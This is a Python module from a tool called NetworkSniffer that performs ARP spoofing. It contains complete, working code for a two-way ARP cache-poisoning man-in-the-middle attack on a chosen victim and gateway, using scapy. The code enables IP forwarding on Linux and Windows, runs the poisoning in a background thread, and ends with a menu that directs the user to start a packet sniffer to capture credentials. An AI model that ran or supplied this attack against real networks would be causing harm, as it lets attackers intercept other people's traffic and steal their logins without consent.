#!/usr/bin/env python

"""
arp_spoof.py -- ARP Spoofing module for NetworkSniffer
------------------------------------------------------
Performs a two-way ARP cache poisoning (MITM) attack:
  - Tells the VICTIM  that the attacker MAC = gateway IP
  - Tells the GATEWAY that the attacker MAC = victim   IP

All traffic between the victim and gateway is routed
through the attacker machine, enabling packet sniffing.

IMPORTANT (Linux):
  Enable IP forwarding so intercepted packets are forwarded:
      echo 1 > /proc/sys/net/ipv4/ip_forward
  Without this the victim loses internet connectivity.
"""


import os
import socket
import subprocess
import threading
import time
from colorama import Fore, Style, init as colorama_init
from scapy.all import Ether, ARP, srp, sr1, IP, ICMP, conf, sendp

# Initialize colorama for Windows support
colorama_init(autoreset=False)



# ---------------------------------------------------------------------------
# Global state — PROPERLY INITIALIZED with None defaults
# ---------------------------------------------------------------------------

_active_spoof_thread: threading.Thread | None = None
_active_spoof_stop_event: threading.Event | None = None



# ---------------------------------------------------------------------------
# Logging helpers — consistent prefixes across all modules
# ---------------------------------------------------------------------------

def _info(msg: str) -> None:
    print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {msg}")

def _ok(msg: str) -> None:
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def _warn(msg: str) -> None:
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def _err(msg: str) -> None:
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {msg}")



# ---------------------------------------------------------------------------
# MAC resolution
# ---------------------------------------------------------------------------

def get_mac(ip: str) -> str | None:
    """Resolve *ip* to its MAC via an ARP who-has broadcast."""
    arp_request = ARP(pdst=ip)
    broadcast   = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet      = broadcast / arp_request
    try:
        answered, _ = srp(packet, timeout=2, verbose=False)
        if answered:
            return answered[0][1].hwsrc
    except Exception:
        pass
    return None



def is_host_reachable(ip: str) -> bool:
    """Return True if host responds to ARP or ICMP ping."""
    mac = get_mac(ip)
    if mac:
        return True
    try:
        resp = sr1(IP(dst=ip)/ICMP(), timeout=2, verbose=False)
        return resp is not None
    except Exception:
        return False



# ---------------------------------------------------------------------------
# IP Forwarding — cross-platform (Windows + Linux)
# ---------------------------------------------------------------------------

def is_ip_forwarding_enabled() -> bool:
    """Check whether IPv4 forwarding is enabled on the current OS."""
    if os.name == 'nt':
        # Windows: query the registry via netsh
        try:
            result = subprocess.run(
                ['netsh', 'interface', 'ipv4', 'show', 'global'],
                capture_output=True, text=True, timeout=10,
            )
            # Look for "IP Forwarding" line — value is "enabled" or "disabled"
            for line in result.stdout.splitlines():
                if 'forwarding' in line.lower():
                    return 'enabled' in line.lower()
        except Exception:
            pass
        return False
    else:
        # Linux: read the kernel parameter
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip() == '1'
        except Exception:
            return False


def set_ip_forwarding(enable: bool) -> bool:
    """Enable or disable IP forwarding on Windows or Linux.

    Returns True on success, False on failure.
    """
    action = "enabled" if enable else "disabled"

    if os.name == 'nt':
        return _set_ip_forwarding_windows(enable, action)
    else:
        return _set_ip_forwarding_linux(enable, action)


def _set_ip_forwarding_windows(enable: bool, action: str) -> bool:
    """Enable/disable IP forwarding on Windows via PowerShell or netsh."""
    state = "Enabled" if enable else "Disabled"

    # Method 1: PowerShell Set-NetIPInterface (preferred, per-interface)
    try:
        result = subprocess.run(
            ['powershell', '-Command',
             f'Get-NetIPInterface -AddressFamily IPv4 | '
             f'Set-NetIPInterface -Forwarding {state}'],
            capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            if is_ip_forwarding_enabled() == enable:
                _ok(f"IP forwarding {action} (PowerShell).")
                return True
    except FileNotFoundError:
        pass
    except Exception as e:
        _warn(f"PowerShell method failed: {e}")

    # Method 2: netsh fallback
    try:
        result = subprocess.run(
            ['netsh', 'interface', 'ipv4', 'set', 'global',
             f'forwarding={state.lower()}'],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0:
            if is_ip_forwarding_enabled() == enable:
                _ok(f"IP forwarding {action} (netsh).")
                return True
    except Exception as e:
        _warn(f"netsh method failed: {e}")

    _err(f"Could not {action[:-1]}e IP forwarding. Run as Administrator.")
    return False


def _set_ip_forwarding_linux(enable: bool, action: str) -> bool:
    """Enable/disable IP forwarding on Linux via /proc."""
    val = "1" if enable else "0"

    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(val)

        if is_ip_forwarding_enabled() == enable:
            _ok(f"IP forwarding {action}.")
            return True
        _warn(f"IP forwarding state may not have changed (wanted {action}).")
        return False
    except PermissionError:
        _err(f"Permission denied when trying to {action[:-1]}e IP forwarding. Run as root.")
        return False
    except Exception as e:
        _err(f"Failed to {action[:-1]}e IP forwarding: {e}")
        return False




# ---------------------------------------------------------------------------
# Spoofing helpers
# ---------------------------------------------------------------------------

def spoof(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    """Send an ARP reply making target believe attacker owns spoof_ip."""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )
    sendp(Ether(dst=target_mac) / packet, verbose=False)


def restore(destination_ip: str, destination_mac: str,
            source_ip: str, source_mac: str) -> None:
    """Restore the correct ARP entry (4 packets to ensure it sticks)."""
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(Ether(dst=destination_mac) / packet, verbose=False, count=4)


def _spoof_session(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    stop_event: threading.Event,
) -> None:
    """Keep poisoning ARP tables until the stop event is set."""
    packet_count = 0
    try:
        while not stop_event.is_set():
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            packet_count += 1
            # Print a heartbeat every 5 cycles (10 seconds)
            if packet_count % 5 == 0:
                print(f"{Fore.CYAN}[*] ARP spoofing active — {packet_count} packets sent{Style.RESET_ALL}")
            stop_event.wait(2)
    except Exception as e:
        _err(f"Error in spoof session thread: {e}")
    finally:
        print("")
        _warn("Stopping ARP spoofing — restoring ARP tables...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)

        set_ip_forwarding(False)

        _ok("ARP tables restored successfully.")
        print("")



# ---------------------------------------------------------------------------
# Thread lifecycle management
# ---------------------------------------------------------------------------

def stop_arp_spoof_background() -> None:
    """Stop the active background ARP-spoof session, if one exists."""
    global _active_spoof_thread, _active_spoof_stop_event

    if _active_spoof_stop_event is not None:
        _active_spoof_stop_event.set()

    if _active_spoof_thread is not None and _active_spoof_thread.is_alive():
        _active_spoof_thread.join(timeout=10)

    # Reset state for next run
    _active_spoof_thread = None
    _active_spoof_stop_event = None


def is_arp_spoof_active() -> bool:
    """Return True if ARP spoofing is currently running in background."""
    return (_active_spoof_thread is not None
            and _active_spoof_thread.is_alive())



# ---------------------------------------------------------------------------
# Auto-detect default gateway
# ---------------------------------------------------------------------------

def _auto_detect_gateway() -> str | None:
    """Return the default gateway IP, or None if detection fails."""
    try:
        gw = conf.route.route("0.0.0.0")[1]
        if gw and gw != "0.0.0.0" and gw != "":
            return gw
    except Exception:
        pass

    # Linux fallback: parse /proc/net/route
    if os.name != 'nt':
        try:
            with open('/proc/net/route', 'r') as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[1] == '00000000':
                        gw_hex = parts[2]
                        # /proc/net/route uses network byte order (little-endian hex)
                        gw_bytes = bytes.fromhex(gw_hex)
                        gw_ip = socket.inet_ntoa(bytes(reversed(gw_bytes)))
                        return gw_ip
        except Exception:
            pass

    return None





# ---------------------------------------------------------------------------
# Main ARP-spoof session
# ---------------------------------------------------------------------------

def main_arp_spoof(target_ip: str | None = None,
                   gateway_ip: str | None = None) -> bool:
    """Interactive entry point: collect IPs, then start spoofing in background.

    Returns True when the spoof session was started successfully, False otherwise.
    """
    global _active_spoof_thread, _active_spoof_stop_event


    if is_arp_spoof_active():
        _warn("ARP spoofing is already running in the background.")
        return False

    print(f"\n{Fore.CYAN}{'='*55}")
    print(f"         ARP Spoofer — MITM Module")
    print(f"{'='*55}{Style.RESET_ALL}")

    # --- IP forwarding check ---
    if not is_ip_forwarding_enabled():
        _warn("IP forwarding appears to be disabled.")
        _info("Will attempt to enable it automatically before spoofing starts.")

    # ---- Collect target (victim) IP ----
    try:
        if not target_ip:
            target_ip = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Enter Victim IP: ").strip()
        else:
            _ok(f"Victim IP: {target_ip}")

        if not target_ip:
            _err("No victim IP provided. Aborting.")
            return False

        # ---- Collect gateway IP ----
        if not gateway_ip:
            gw_prompt = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Enter Gateway IP (blank to auto-detect): ").strip()
            gateway_ip = gw_prompt if gw_prompt else None
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
        stop_arp_spoof_background()
        return False


    # Auto-detect gateway if omitted
    if not gateway_ip:
        _info("Auto-detecting gateway...")
        gw = _auto_detect_gateway()
        if gw:
            gateway_ip = gw
            _ok(f"Auto-detected gateway: {gateway_ip}")
        else:
            _err("Could not auto-detect gateway. Please specify one.")
            return False

    # Resolve MACs
    _info("Resolving MAC addresses...")

    if not is_host_reachable(target_ip):
        _err(f"Victim {target_ip} appears offline or unreachable.")
        return False
    target_mac = get_mac(target_ip)
    if not target_mac:
        _err(f"Could not resolve MAC for victim {target_ip}. Aborting.")
        return False

    if not is_host_reachable(gateway_ip):
        _err(f"Gateway {gateway_ip} appears offline or unreachable.")
        return False
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        _err(f"Could not resolve MAC for gateway {gateway_ip}. Aborting.")
        return False

    print(f"\n{Fore.GREEN}[+] Victim  : {target_ip}  ->  {target_mac}")
    print(f"[+] Gateway : {gateway_ip}  ->  {gateway_mac}{Style.RESET_ALL}")


    # Start the background spoofing thread
    print(f"\n{Fore.CYAN}{'─'*55}")
    print(f"   Starting ARP poisoning in background...")
    print(f"{'─'*55}{Style.RESET_ALL}\n")

    _active_spoof_stop_event = threading.Event()

    _active_spoof_thread = threading.Thread(
        target=_spoof_session,
        args=(target_ip, target_mac, gateway_ip, gateway_mac, _active_spoof_stop_event),
        daemon=True,
    )
    _active_spoof_thread.start()


    # Enable IP forwarding (required for MITM — works on both Linux and Windows)
    if not is_ip_forwarding_enabled():
        set_ip_forwarding(True)

    print(f"{Fore.GREEN}{'═'*55}")
    print(f"   ✓ ARP spoofing is NOW ACTIVE in the background")
    print(f"   ✓ Victim: {target_ip}  ↔  Gateway: {gateway_ip}")
    print(f"   ✓ All traffic is being forwarded through this machine")
    print(f"{'─'*55}")
    print(f"   Next steps:")
    print(f"     [2] Start Packet Sniffer to capture credentials")
    print(f"     [3] Stop ARP Spoofing and restore ARP tables")
    print(f"     [4] Exit")
    print(f"{'═'*55}{Style.RESET_ALL}\n")

    return True